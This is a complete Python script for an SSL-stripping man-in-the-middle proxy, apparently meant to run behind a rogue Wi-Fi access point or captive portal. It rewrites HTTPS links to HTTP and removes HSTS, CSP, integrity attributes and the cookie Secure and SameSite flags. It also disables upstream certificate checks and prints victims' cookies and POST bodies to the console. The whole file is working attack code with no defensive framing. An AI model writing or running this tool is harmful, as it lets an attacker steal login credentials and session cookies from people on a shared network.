#!/usr/bin/env python3
"""
Generic SSL-strip proxy.
Intercepts plain-HTTP requests, forwards them to the upstream HTTPS server,
strips HSTS headers, and rewrites https:// to http:// in responses.
Usage: sslstrip_proxy_generic.py <listen_port> [portal_ip]
"""
import sys
import ssl
import socket
import threading
import re

LISTEN_PORT   = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
PORTAL_IP     = sys.argv[2] if len(sys.argv) > 2 else "192.168.4.1"
UPSTREAM_PORT = 443

def dechunk(body):
    result = b""
    try:
        while body:
            crlf = body.find(b"\r\n")
            if crlf == -1:
                break
            chunk_size = int(body[:crlf], 16)
            if chunk_size == 0:
                break
            result += body[crlf + 2:crlf + 2 + chunk_size]
            body = body[crlf + 2 + chunk_size + 2:]
    except Exception:
        return body
    return result

def strip_response(data, host=""):
    header_end = data.find(b"\r\n\r\n")
    if header_end == -1:
        return data

    headers_raw = data[:header_end]
    body = data[header_end + 4:]

    lines = headers_raw.split(b"\r\n")
    filtered = []
    is_chunked = False
    for line in lines:
        lower = line.lower()
        if lower.startswith(b"x-frame-options"):
            continue
        if lower.startswith(b"strict-transport-security"):
            continue
        if lower.startswith(b"content-encoding:"):
            continue
        if lower.startswith(b"content-length:"):
            continue
        if lower.startswith(b"transfer-encoding:"):
            is_chunked = b"chunked" in lower
            continue
        if lower.startswith(b"content-security-policy"):
            continue
        if lower.startswith(b"set-cookie:"):
            line = re.sub(rb"(?i);\s*secure", b"", line)
            line = re.sub(rb"(?i);\s*samesite=(strict|lax|none)", b"", line)
            decoded = line.decode(errors="replace")
            sys.stdout.write("\033[93m[cookie] %s\033[0m\n" % decoded)
            sys.stdout.flush()
        if lower.startswith(b"location:") and b"https://" in lower:
            line = re.sub(b"(?i)https://", b"http://", line, count=1)
            line = re.sub(b"(?i)(http://[^/:]+):443(/|$)", b"\\1\\2", line)
        filtered.append(line)

    if is_chunked:
        body = dechunk(body)

    content_type = b""
    for line in filtered:
        if line.lower().startswith(b"content-type:"):
            content_type = line.lower()
            break

    if b"text/html" in content_type:
        body = re.sub(b'(?i)((?:href|action|src)=["\'])https://', b'\\1http://', body)
        body = re.sub(b'(?i)((?:href|action|src)=["\']http://[^/:]+):443(/|["\'])', b'\\1\\2', body)
        body = re.sub(b'(?i)\s*integrity=["\'][^"\']*["\']', b'', body)
        body = re.sub(b'(?i)\s*crossorigin=["\'][^"\']*["\']', b'', body)

    if b"javascript" in content_type or b"json" in content_type:
        body = re.sub(b'(?i)https://', b'http://', body)
        body = re.sub(b'(?i)https:\\\\/\\\\/', b'http:\\\\/', body)
        body = re.sub(b'(?i)(http://[^/:"\' ]+):443(/|["\' ]|$)', b'\\1\\2', body)

    if b"text/html" in content_type:
        body = re.sub(
            b'(?si)(<script[^>]*>)(.*?)(</script>)',
            lambda m: m.group(1) + re.sub(b'(?i)https://', b'http://', m.group(2)) + m.group(3),
            body
        )

    filtered.append(b"Content-Length: " + str(len(body)).encode())
    headers_raw = b"\r\n".join(filtered)
    return headers_raw + b"\r\n\r\n" + body

def read_all(sock):
    data = b""
    sock.settimeout(5)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"\r\n\r\n" in data:
                header_end = data.find(b"\r\n\r\n")
                headers = data[:header_end].decode(errors="replace")
                m = re.search(r"content-length:\s*(\d+)", headers, re.IGNORECASE)
                if m:
                    expected = header_end + 4 + int(m.group(1))
                    while len(data) < expected:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                    break
                elif re.search(r"transfer-encoding:\s*chunked", headers, re.IGNORECASE):
                    while not data.endswith(b"\r\n0\r\n\r\n"):
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                    break
                else:
                    break
    except socket.timeout:
        pass
    return data

def handle_client(client_sock):
    try:
        request = b""
        client_sock.settimeout(5)
        try:
            while b"\r\n\r\n" not in request:
                chunk = client_sock.recv(4096)
                if not chunk:
                    return
                request += chunk
        except socket.timeout:
            return

        header_end = request.find(b"\r\n\r\n")
        headers_so_far = request[:header_end].decode(errors="replace")
        cl_match = re.search(r"content-length:\s*(\d+)", headers_so_far, re.IGNORECASE)
        if cl_match:
            expected_total = header_end + 4 + int(cl_match.group(1))
            client_sock.settimeout(5)
            try:
                while len(request) < expected_total:
                    chunk = client_sock.recv(4096)
                    if not chunk:
                        break
                    request += chunk
            except socket.timeout:
                pass

        host_match = re.search(r"^Host:\s*(.+)$", headers_so_far, re.MULTILINE | re.IGNORECASE)
        if not host_match:
            sys.stdout.write("[!] sslstrip: no Host header, dropping request\n")
            sys.stdout.flush()
            return

        host = host_match.group(1).strip().split(":")[0]
        first_line = request.split(b"\r\n")[0].decode(errors="replace")

        if host == PORTAL_IP:
            sys.stdout.write("[portal] %s\n" % first_line)
            sys.stdout.flush()
            def _rewrite_portal_line(m):
                method = m.group(0).split(b" ", 1)[0]
                parts = m.group(0).split(b"/", 3)
                path = b"/" + (parts[3].split(b" ")[0] if len(parts) > 3 else b"")
                return method + b" " + path + b" "
            modified_request = re.sub(
                b"(?i)^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS) http://[^ ]+ ",
                _rewrite_portal_line, request, count=1
            )
            modified_request = re.sub(b"(?i)\r\nConnection: [^\r]+", b"\r\nConnection: close", modified_request)
            portal_sock = socket.create_connection((PORTAL_IP, 80), timeout=10)
            portal_sock.sendall(modified_request)
            response = read_all(portal_sock)
            portal_sock.close()
            client_sock.sendall(response)
            return

        sys.stdout.write("[>] %s -> https://%s\n" % (first_line, host))

        if first_line.upper().startswith("POST ") and len(request) > header_end + 4:
            body_raw = request[header_end + 4:].decode(errors="replace")
            if len(body_raw) > 500:
                sys.stdout.write("\033[91m[!] POST body (%d bytes): %s ...[truncated]\033[0m\n" % (len(body_raw), body_raw[:500]))
            else:
                sys.stdout.write("\033[91m[!] POST body: %s\033[0m\n" % body_raw)

        sys.stdout.flush()

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        upstream_sock = socket.create_connection((host, UPSTREAM_PORT), timeout=10)
        upstream_ssl = ctx.wrap_socket(upstream_sock, server_hostname=host)

        def rewrite_request_line(m):
            method = m.group(0).split(b" ", 1)[0]
            parts = m.group(0).split(b"/", 3)
            path = b"/" + (parts[3].split(b" ")[0] if len(parts) > 3 else b"")
            return method + b" " + path + b" "

        modified_request = re.sub(
            b"(?i)^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS) http://[^ ]+ ",
            rewrite_request_line,
            request, count=1
        )
        modified_request = re.sub(b"(?i)\r\nConnection: [^\r]+", b"\r\nConnection: close", modified_request)
        modified_request = re.sub(b"(?i)\r\nAccept-Encoding: [^\r]+", b"", modified_request)

        upstream_ssl.sendall(modified_request)

        response = read_all(upstream_ssl)
        upstream_ssl.close()

        status_line = response.split(b"\r\n")[0].decode(errors="replace") if response else "(empty)"
        sys.stdout.write("[<] %s <- %s\n" % (host, status_line))

        if response and (b"301 " in response[:50] or b"302 " in response[:50] or b"303 " in response[:50]):
            for rline in response.split(b"\r\n"):
                if rline.lower().startswith(b"location:"):
                    sys.stdout.write("\033[96m[>>] redirect: %s\033[0m\n" % rline.decode(errors="replace"))
                    break

        sys.stdout.flush()

        response = strip_response(response, host)
        client_sock.sendall(response)
    except Exception as e:
        sys.stdout.write("[!] sslstrip error: %s\n" % e)
        sys.stdout.flush()
    finally:
        client_sock.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(64)

    sys.stdout.write("started\n")
    sys.stdout.flush()

    while True:
        try:
            client_sock, _ = server.accept()
            t = threading.Thread(target=handle_client, args=(client_sock,), daemon=True)
            t.start()
        except Exception:
            break

if __name__ == "__main__":
    main()
